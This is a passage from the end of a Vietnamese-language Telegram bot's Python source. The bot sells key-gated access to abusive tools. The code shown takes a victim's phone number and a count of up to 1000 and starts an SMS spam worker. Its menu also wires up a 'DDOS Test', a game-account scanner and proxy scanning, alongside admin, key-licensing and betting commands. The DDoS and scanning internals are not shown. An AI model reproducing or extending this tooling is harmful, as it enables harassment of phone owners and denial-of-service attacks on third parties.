        state = context.user_data["expect_spam"]
        if state == "phone":
            if not re.match(r"^0\d{9}$", txt): await update.message.reply_text("❌ SĐT không hợp lệ."); return
            context.user_data["spam_phone"] = txt; context.user_data["expect_spam"] = "count"
            await update.message.reply_text("Nhập số lần (1-1000):")
        elif state == "count":
            try: cnt = int(txt); assert 1 <= cnt <= 1000
            except: await update.message.reply_text("❌ 1-1000"); return
            phone = context.user_data.get("spam_phone")
            context.user_data.pop("expect_spam",None); context.user_data.pop("spam_phone",None)
            asyncio.create_task(spam_worker(update.effective_chat.id, phone, cnt, context))
            await update.message.reply_text(f"🚀 Bắt đầu spam {cnt} lần tới {phone}")
        return

    if "expect_game_bet" in context.user_data: await process_game_bet_amount(update, context); return

    if "expect_xw" in context.user_data:
        expect = context.user_data["expect_xw"]; data = get_user_xworld_data(uid)
        if expect == "account_link":
            u, k = parse_account_link(txt)
            if u and k:
                data["accounts"].append({"user_id":u,"secret_key":k}); data["claimed_history"].setdefault(u,[]); save_all_data()
                await update.message.reply_text(f"✅ Đã thêm `{u}`.", parse_mode='Markdown', reply_markup=xw_settings_keyboard())
            else: await update.message.reply_text("❌ Link lỗi.", reply_markup=xw_settings_keyboard())
            context.user_data.pop("expect_xw")
        elif expect == "threshold":
            try: v = int(txt); assert v > 0; data["threshold"] = v; save_all_data()
            except: await update.message.reply_text("❌ Số nguyên dương."); return
            await update.message.reply_text(f"✅ Ngưỡng mới: {v}", reply_markup=xw_settings_keyboard())
            context.user_data.pop("expect_xw")
        elif expect == "code":
            info = get_code_info(txt, get_proxy_dict(uid))
            if info["status"]:
                if not any(c["code"]==txt for c in data["codes"]):
                    data["codes"].append({"code":txt,"info":info}); save_all_data()
                    await update.message.reply_text(f"✅ Thêm code `{txt}` | Còn: {info['remaining']}/{info['total']}", reply_markup=xworld_menu_keyboard())
                else: await update.message.reply_text("⚠️ Đã có.", reply_markup=xworld_menu_keyboard())
            else: await update.message.reply_text(f"❌ Code lỗi: {info.get('message')}", reply_markup=xworld_menu_keyboard())
            context.user_data.pop("expect_xw")
        return

    await update.message.reply_text("Gõ /menu để xem danh sách lệnh.")

# ==================== ADMIN COMMANDS ====================
async def cmd_broadcast(update, context):
    if not is_owner(update.effective_user.id): return
    if not context.args: await update.message.reply_text("/broadcast <msg>"); return
    msg = " ".join(context.args); sent = 0
    for k in user_data_store:
        if k in ("owner","blacklist","bot_enabled"): continue
        try: await context.bot.send_message(int(k), f"📢 {msg}"); sent += 1
        except: pass
    await update.message.reply_text(f"✅ Đã gửi đến {sent} người.")

async def cmd_ban(update, context):
    if not is_owner(update.effective_user.id): return
    if not context.args: return
    try: target = int(context.args[0])
    except: await update.message.reply_text("ID lỗi."); return
    if target == update.effective_user.id: await update.message.reply_text("Không thể tự ban."); return
    bl = user_data_store.setdefault("blacklist",[])
    if str(target) not in bl: bl.append(str(target)); save_all_data(); await update.message.reply_text(f"✅ Đã ban {target}.")
    else: await update.message.reply_text(f"ℹ️ Đã bị ban.")

async def cmd_unban(update, context):
    if not is_owner(update.effective_user.id): return
    if not context.args: return
    try: target = int(context.args[0])
    except: return
    bl = user_data_store.setdefault("blacklist",[])
    if str(target) in bl: bl.remove(str(target)); save_all_data(); await update.message.reply_text(f"✅ Đã bỏ ban {target}.")
    else: await update.message.reply_text(f"ℹ️ Không có trong blacklist.")

async def cmd_list_ids(update, context):
    if not is_owner(update.effective_user.id): return
    users = []; banned = []
    for k,v in user_data_store.items():
        if k in ("owner","blacklist","bot_enabled"): continue
        try: users.append(int(k))
        except: pass
    for b in user_data_store.get("blacklist",[]):
        try: banned.append(int(b))
        except: pass
    lines = []
    if users: lines.append(f"📋 Hoạt động ({len(users)}):"); lines.extend(f"• `{u}`" for u in sorted(users))
    if banned: lines.append(f"\n🚫 Bị ban ({len(banned)}):"); lines.extend(f"• `{b}`" for b in sorted(banned))
    if not lines: await update.message.reply_text("Chưa có ai."); return
    if len(users)+len(banned) <= 100: await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
    else:
        with tempfile.NamedTemporaryFile("w", delete=False, suffix=".txt", encoding="utf-8") as f:
            f.write("Danh sách ID\n"); f.write(f"-- Hoạt động ({len(users)}) --\n"); f.writelines(f"{u}\n" for u in sorted(users))
            if banned: f.write(f"\n-- Bị ban ({len(banned)}) --\n"); f.writelines(f"{b}\n" for b in sorted(banned))
            f_path = f.name
        await update.message.reply_document(open(f_path,"rb"), filename="ids.txt"); os.unlink(f_path)

async def cmd_whois(update, context):
    if not is_owner(update.effective_user.id): return
    if not context.args: return
    try: target = int(context.args[0])
    except: return
    p = user_data_store.get(str(target),{}).get("profile",{})
    if not p: await update.message.reply_text("❌ Không có dữ liệu."); return
    uname = f"@{p['username']}" if p.get("username") else "Không"
    full = f"{p.get('first_name','')} {p.get('last_name','')}".strip() or "Không"
    await update.message.reply_text(f"👤 *{target}*\n• Tên: {full}\n• Username: {uname}", parse_mode="Markdown")

async def cmd_channel(update, context):
    if not is_owner(update.effective_user.id): return
    if not context.args: return
    uname = context.args[0]
    if not uname.startswith("@"): uname = "@"+uname
    try:
        chat = await context.bot.get_chat(uname)
        members = "Không rõ"
        try: members = str(await chat.get_member_count())
        except: pass
        info = f"📺 {uname}\n• Tên: {chat.title}\n• Loại: {chat.type}"
        if chat.description: info += f"\n• Mô tả: {chat.description[:200]}"
        info += f"\n• Thành viên: {members}"
        await update.message.reply_text(info)
    except BadRequest as e: await update.message.reply_text(f"❌ {e.message}")

async def cmd_setowner(update, context):
    uid = update.effective_user.id
    owner = user_data_store.get("owner",0)
    if owner == 0 or owner == uid: user_data_store["owner"] = uid; save_all_data(); await update.message.reply_text(f"✅ Bạn là chủ bot.")
    else: await update.message.reply_text("❌ Chủ bot đã được thiết lập.")

# ==================== KEY ADMIN COMMANDS ====================
async def cmd_genkey(update, context):
    uid = update.effective_user.id
    if not is_owner(uid): return
    duration = context.args[0] if context.args else None
    key = create_key(uid, duration)
    expiry = "vĩnh viễn"
    if duration:
        match = re.match(r"(\d+)\s*(s|m|h|d|w|month|year)", duration.lower())
        if match: expiry = f"sau {match.group(1)} {match.group(2)}"
    await update.message.reply_text(f"🔑 Key: `{key}`\n⏱️ Hết hạn: {expiry}", parse_mode="Markdown")

async def cmd_listkeys(update, context):
    if not is_owner(update.effective_user.id): return
    keys = user_data_store.get("keys", {})
    if not keys: await update.message.reply_text("Chưa có key nào."); return
    lines = ["Danh sách key:"]
    for k, v in keys.items():
        expires = v.get("expires_at","vĩnh viễn")
        assigned = v.get("assigned_to","chưa dùng")
        lines.append(f"`{k}` -> {assigned} (hết hạn: {expires})")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def cmd_keyinfo(update, context):
    if not is_owner(update.effective_user.id): return
    if not context.args: return
    key = context.args[0]
    info = user_data_store.get("keys",{}).get(key)
    if not info: await update.message.reply_text("Key không tồn tại."); return
    await update.message.reply_text(f"Key: {key}\nTạo bởi: {info['created_by']}\nNgày tạo: {info['created_at']}\nHết hạn: {info.get('expires_at','vĩnh viễn')}\nNgười dùng: {info.get('assigned_to','chưa')}")

async def cmd_revokekey(update, context):
    if not is_owner(update.effective_user.id): return
    if not context.args: return
    key = context.args[0]
    keys = user_data_store.get("keys",{})
    if key not in keys: await update.message.reply_text("Key không tồn tại."); return
    assigned = keys[key].get("assigned_to")
    if assigned: user_data_store[str(assigned)]["activated_key"] = None
    del keys[key]; save_all_data()
    await update.message.reply_text("✅ Đã thu hồi key.")

# ==================== USER PROXY COMMANDS ====================
async def cmd_setproxy(update, context):
    uid = update.effective_user.id
    if not check_antispam(uid): return
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    if not context.args:
        set_user_proxy(uid, None)
        await update.message.reply_text("✅ Đã xóa proxy của bạn.")
    else:
        proxy_str = context.args[0]
        set_user_proxy(uid, proxy_str)
        await update.message.reply_text(f"✅ Đã lưu proxy: {proxy_str}")

async def cmd_myproxy(update, context):
    uid = update.effective_user.id
    if not check_antispam(uid): return
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    proxy = get_user_proxy_string(uid)
    if proxy: await update.message.reply_text(f"Proxy của bạn: {proxy}")
    else: await update.message.reply_text("Bạn chưa cài proxy. Dùng /setproxy <proxy>")

# ==================== START & MENU ====================
async def start(update, context):
    uid = update.effective_user.id; update_user_profile(uid, update)
    if is_owner(uid):
        await update.message.reply_text("Chào chủ bot! Gõ /menu.")
        return
    if not check_user_key(uid):
        await request_key(update, context); return
    welcome = grant_welcome_bonus(uid); daily = grant_daily_bonus(uid)
    g = get_user_game_data(uid)
    msg = f"Chào mừng! ID: `{uid}`\n💰 Số dư: {format_money(g['balance'])}"
    if welcome: msg += "\n🎁 +10,000,000 VND thưởng lần đầu!"
    if daily: msg += "\n📅 +500,000 VND thưởng hàng ngày."
    msg += "\nGõ /menu để xem danh sách lệnh."
    await update.message.reply_text(msg, parse_mode='Markdown')

async def menu_command(update, context):
    uid = update.effective_user.id; update_user_profile(uid, update)
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    if not is_bot_enabled() and not is_owner(uid): await update.message.reply_text("⚠️ Bot đang tạm dừng."); return
    if not check_antispam(uid): return
    if is_blacklisted(uid): return
    commands_text = (
        "📋 *Danh sách lệnh:*\n"
        "/start - Bắt đầu\n"
        "/menu - Xem menu\n"
        "/setproxy <proxy> - Cài proxy riêng\n"
        "/myproxy - Xem proxy hiện tại\n"
        "/proxy - Scan Proxy\n"
        "/xworld - Canh Code\n"
        "/game - Tài Xỉu\n"
        "/ddos - DDOS Test\n"
        "/scanlq - Scan Acc LQ\n"
        "/spam - Spam SMS\n"
        "/top - Bảng xếp hạng\n"
        "/bank <id> <số> - Chuyển tiền\n"
        "Chỉ admin: /vnd, /broadcast, /ban, /unban, /id, /whois, /channel, /stopbot, /startbot, /genkey, /listkeys, /keyinfo, /revokekey"
    )
    await update.message.reply_text(commands_text, parse_mode="Markdown")

# ==================== LỆNH TẮT ====================
async def cmd_proxy(update, context):
    if not is_owner(update.effective_user.id) and not check_user_key(update.effective_user.id): await request_key(update, context); return
    await update.message.reply_text("🌐 Scan Proxy", reply_markup=proxy_menu_keyboard())
async def cmd_xworld(update, context):
    if not is_owner(update.effective_user.id) and not check_user_key(update.effective_user.id): await request_key(update, context); return
    await update.message.reply_text("🎯 Canh Code", reply_markup=xworld_menu_keyboard())
async def cmd_game(update, context):
    uid = update.effective_user.id
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    mk, tx = game_menu_keyboard(uid)
    await update.message.reply_text(tx, parse_mode='Markdown', reply_markup=mk)
async def cmd_ddos(update, context):
    if not is_owner(update.effective_user.id) and not check_user_key(update.effective_user.id): await request_key(update, context); return
    await update.message.reply_text("💣 DDOS Test", reply_markup=ddos_menu_keyboard())
async def cmd_scanlq(update, context):
    if not is_owner(update.effective_user.id) and not check_user_key(update.effective_user.id): await request_key(update, context); return
    await update.message.reply_text("🎮 Scan Acc LQ", reply_markup=scan_lq_menu_keyboard())
async def cmd_spam(update, context):
    if not is_owner(update.effective_user.id) and not check_user_key(update.effective_user.id): await request_key(update, context); return
    await update.message.reply_text("📧 Spam SMS", reply_markup=spam_menu_keyboard())

# ==================== MAIN ====================
def main():
    load_all_data()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", menu_command))
    app.add_handler(CommandHandler("proxy", cmd_proxy))
    app.add_handler(CommandHandler("xworld", cmd_xworld))
    app.add_handler(CommandHandler("game", cmd_game))
    app.add_handler(CommandHandler("ddos", cmd_ddos))
    app.add_handler(CommandHandler("scanlq", cmd_scanlq))
    app.add_handler(CommandHandler("spam", cmd_spam))
    app.add_handler(CommandHandler("top", cmd_top))
    app.add_handler(CommandHandler("bank", cmd_bank))
    app.add_handler(CommandHandler("vnd", cmd_vnd))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CommandHandler("unban", cmd_unban))
    app.add_handler(CommandHandler("id", cmd_list_ids))
    app.add_handler(CommandHandler("whois", cmd_whois))
    app.add_handler(CommandHandler("channel", cmd_channel))
    app.add_handler(CommandHandler("setowner", cmd_setowner))
    app.add_handler(CommandHandler("stopbot", cmd_stopbot))
    app.add_handler(CommandHandler("startbot", cmd_startbot))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("listkeys", cmd_listkeys))
    app.add_handler(CommandHandler("keyinfo", cmd_keyinfo))
    app.add_handler(CommandHandler("revokekey", cmd_revokekey))
    app.add_handler(CommandHandler("setproxy", cmd_setproxy))
    app.add_handler(CommandHandler("myproxy", cmd_myproxy))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_proxy_file_upload))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    logger.info("Bot đa năng đang chạy...")
    app.run_polling()

if __name__ == "__main__":
    main()
